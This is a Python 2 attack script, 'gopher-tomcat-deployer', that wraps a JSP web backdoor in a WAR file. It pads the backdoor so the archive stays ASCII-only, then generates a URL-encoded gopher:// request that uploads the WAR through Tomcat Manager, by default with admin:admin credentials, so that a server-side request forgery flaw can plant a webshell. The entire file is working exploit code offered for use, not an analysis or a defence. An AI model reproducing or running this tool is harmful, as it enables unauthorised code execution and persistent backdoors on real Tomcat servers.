import zipfile
import binascii 
import sys
import getopt
import urllib
import re
import base64
import argparse


def get_args():
	parser = argparse.ArgumentParser( prog="gopher-tomcat-deployer.py",
	                formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
	                epilog= '''
	                This script will generate a GOPHER request to deploy a malicious application in
	                the Tomcat Manager. The GOPHER protocol is ASCII only and this script makes sure
	                that the generated malicious war file will properly work when deployed.
	                This script was tested against Tomcat 6.
	                ''')
	parser.add_argument("webshell", help="Path to a .jsp web backdoor")
	parser.add_argument("-o", "--output", default="cmd.war", help="Output file name (default: cmd.war)")
	parser.add_argument("-u", "--user", default="admin", help="Tomcat user (default: admin)")
	parser.add_argument("-p", "--password", default="admin", help="Tomcat password (default: admin)")
	parser.add_argument("-t", "--target", default="127.0.0.1", help="Target Tomcat IP address (default = 127.0.0.1)")
	parser.add_argument("-pt", "--port", default="8080", help="Target Tomcat port (default = 8080)")
	args = parser.parse_args()
	return args

def main():

	print
	print '============================================================================='
	print '|                        GOPHER TOMCAT DEPLOYER v0.1                        |'
	print '|                              by pimps and alec                            |'
	print '=============================================================================\n'

	args = get_args() # get the cl args

	inputfile = args.webshell.strip()
	outputfile = args.output.strip()
	tomcat_user = args.user.strip()
	tomcat_password = args.password.strip()
	tomcat_address = args.target.strip()
	tomcat_port = args.port.strip()

	with open(inputfile, 'r') as f:
		webshell_data = f.read()

	valid_encoded_zip = 0
	appended_whitespace = 0
	while valid_encoded_zip == 0:
		webshell_data = validate_webshell_length_and_crc32(webshell_data)
		print "[+] Creating new zip file: " + outputfile
		create_war_zip_file(outputfile,inputfile,webshell_data)
		print "[+] Validating created war file... " + outputfile
		valid_encoded_zip = validate_zipfile(outputfile)
		if valid_encoded_zip == 0:
			print "[-] Invalid checksum/offset found in zip file. Adding white space and trying again..."
			webshell_data += ' '
			appended_whitespace += 1
		else:
			print "[+] Valid WAR file generated... Creating the gopher payload now..."
			gopher_payload = build_gopher_payload(tomcat_address, tomcat_port, tomcat_user, tomcat_password, outputfile)
			print "[+] Payload generated with success: "
			print "------------------------------------------------------------------------"
			print "gopher://127.0.0.1:8080/_{gopher_payload}".format(gopher_payload=gopher_payload)
			print "------------------------------------------------------------------------"
			print "HACK THE PLANET!!1!11!"
	
def create_war_zip_file(war_filename,inputfile,webshell_data):
	warzip = zipfile.ZipFile(war_filename,'w') 
	# Write a known good date/war_filename stamp - this date/time does not contain and invalid byte values
	info = zipfile.ZipInfo(inputfile,date_time=(1980, 1, 1, 0, 0, 0))
	# Write out the webshell the zip file.
	warzip.writestr(info,webshell_data)
	warzip.close()


def validate_webshell_length_and_crc32(webshell_data): 
	valid_length=0
	valid_crc32=0
	modded_length=0
	
	
	print "Original file length: " +'{0:0{1}X}'.format(len(webshell_data),8)
	print "Original file crc32: " + format(binascii.crc32(webshell_data)& 0xffffffff, 'x')
	while valid_length == 0 or valid_crc32 == 0:
		crc_string = format(binascii.crc32(webshell_data)& 0xffffffff, 'x')
		ws_len_byte_string = '{0:0{1}X}'.format(len(webshell_data),8)
		valid_length=1
		valid_crc32=1
		lead_byte_locations = [0,2,4,6]
		for x in lead_byte_locations:
			try:
				if(ws_len_byte_string[x] == '8' or ws_len_byte_string[x] == '9' or crc_string[x] == '8' or crc_string[x] == '9'):	
					webshell_data = webshell_data+" "
					valid_length = 0
					valid_crc32 = 0
					modded_length = modded_length+1
			except:
				continue
	
	if modded_length > 0:
		print "The input file CRC32 or file length contained an invalid byte."
		print "Length adjustment completed. " + str(modded_length) + " whitespace ' ' chars were added to the webshell input."
		print "New file length: " +'{0:0{1}X}'.format(len(webshell_data),8)
		print "New file crc32: " + format(binascii.crc32(webshell_data)& 0xffffffff, 'x')
	return webshell_data

def url_encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

def is_ascii(text):
    if isinstance(text, unicode):
        try:
            text.encode('ascii')
        except UnicodeEncodeError:
            return False
    else:
        try:
            text.decode('ascii')
        except UnicodeDecodeError:
            return False
    return True
	
def validate_zipfile(warzip):
	entire_zip = ""
	with open(warzip, 'rb') as f:
		entire_zip = f.read()
		if(is_ascii(entire_zip) == False):
			return 0
		return 1
		

def build_gopher_payload(host, port, tomcat_user, tomcat_pass, filename):
	warfile = ""
	with open(filename, 'rb') as f:
		warfile = f.read()
	headers =  'POST /manager/html/upload HTTP/1.1\r\n'
	headers += 'Host: {host}:{port}\r\n'
	headers += 'Content-Type: multipart/form-data; boundary=---------------------------1510321429715549663334762841\r\n'
	headers += 'Content-Length: {contentlength}\r\n'
	headers += 'Authorization: Basic {credential}\r\n'
	headers += 'Connection: close\r\n'
	headers += 'Upgrade-Insecure-Requests: 1\r\n'
	headers += '\r\n'
	headers += '{content_body}'

	content =  '-----------------------------1510321429715549663334762841\r\n'
	content += 'Content-Disposition: form-data; name="deployWar"; filename="{filename}"\r\n'
	content += 'Content-Type: application/octet-stream\r\n'
	content += '\r\n'
	content += '{warfile}\r\n'
	content += '-----------------------------1510321429715549663334762841--\r\n'

	content_body = content.format(
		filename=filename,
		warfile=warfile
		)
	payload = headers.format(
		host=host, 
		port=port, 
		credential=base64.b64encode(tomcat_user + ":" + tomcat_pass), 
		contentlength=len(content_body),
		content_body=content_body
		)
	return url_encode_all(payload)
		

if __name__== "__main__":
	main()